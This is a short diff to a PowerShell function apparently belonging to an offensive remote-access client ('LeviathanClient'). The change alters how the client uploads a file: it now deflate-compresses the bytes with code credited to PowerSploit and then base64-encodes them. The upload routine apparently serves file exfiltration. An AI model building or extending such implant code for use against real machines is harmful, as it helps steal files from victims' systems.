@@ -93,8 +93,15 @@ function Start-LeviathanClient {
                     $filePath = (Resolve-Path -Path $filePath).Path
                     $fileName = Split-Path -Path $filePath -Leaf
                     Write-Verbose "uploading file $filePath"
-                    $fileData = Get-Content -Path $filePath -Encoding Byte
-                    $fileData = [Convert]::ToBase64String($fileData)
+                    $rawData = [System.IO.File]::ReadAllBytes($filePath)
+                    # Taken from powersploit
+                    $CompressedStream = New-Object IO.MemoryStream
+                    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+                    $DeflateStream.Write($rawData, 0, $rawData.Length)
+                    $DeflateStream.Dispose()
+                    $CompressedFileBytes = $CompressedStream.ToArray()
+                    $CompressedStream.Dispose()
+                    $fileData = [Convert]::ToBase64String($CompressedFileBytes)
                     $ResultData += [BitConverter]::GetBytes(1) + [Text.Encoding]::ASCII.GetBytes("|$fileData|$fileName")
                 }
                 catch {
